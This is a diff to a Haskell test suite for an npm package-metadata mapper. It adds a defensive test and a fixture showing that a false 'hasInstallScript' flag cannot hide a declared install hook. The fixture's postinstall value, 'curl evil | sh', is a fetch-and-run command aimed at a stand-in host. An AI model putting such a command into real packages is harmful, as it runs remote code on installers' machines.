@@ -119,10 +119,18 @@ signalMappingSpec = describe "signal mapping" $ do
             pkgInstallCode d `shouldNotSatisfy` runsCode
 
         it "maps an explicit hasInstallScript:false to NoCodeOnInstall" $ do
-            -- The abbreviated flag, when present and false, is a determination
-            -- that installation runs no code.
+            -- The abbreviated flag, when present and false and no install hook is
+            -- declared in `scripts`, is a determination that installation runs no
+            -- code.
             d <- projectVersionOf noInstallScriptPackument (mkVersion Npm "1.0.0")
             pkgInstallCode d `shouldBe` NoCodeOnInstall
+
+        it "fails closed when hasInstallScript:false contradicts a declared postinstall script" $ do
+            -- The flag and the `scripts` map are independent wire fields: a hostile
+            -- upstream must not be able to mask a real install hook by lying in the
+            -- sibling flag, so the declared script is authoritative (RunsCodeOnInstall).
+            d <- projectVersionOf falseFlagWithPostinstallPackument (mkVersion Npm "1.0.0")
+            pkgInstallCode d `shouldSatisfy` runsCode
 
     describe "deprecated → Availability" $ do
         it "maps a deprecation notice to Deprecated carrying the message (request)" $ do
@@ -512,6 +520,17 @@ noInstallScriptPackument :: ByteString
 noInstallScriptPackument =
     "{\"name\":\"noscript\",\"versions\":{\"1.0.0\":{\"name\":\"noscript\",\"version\":\"1.0.0\",\
     \\"hasInstallScript\":false,\"dist\":{\"tarball\":\"https://r/noscript/-/noscript-1.0.0.tgz\"}}}}"
+
+{- | A full-form packument whose single version sets @hasInstallScript:false@ but
+declares a real @postinstall@ script — the hostile mismatch a compromised upstream
+could use to try to mask install-time code execution behind the flag. The two wire
+fields are independent, so the projection must fail closed and honour the script.
+-}
+falseFlagWithPostinstallPackument :: ByteString
+falseFlagWithPostinstallPackument =
+    "{\"name\":\"liar\",\"versions\":{\"1.0.0\":{\"name\":\"liar\",\"version\":\"1.0.0\",\
+    \\"hasInstallScript\":false,\"scripts\":{\"postinstall\":\"curl evil | sh\"},\
+    \\"dist\":{\"tarball\":\"https://r/liar/-/liar-1.0.0.tgz\"}}}}"
 
 -- | A packument whose single version declares per-version @maintainers@.
 maintainersPackument :: ByteString
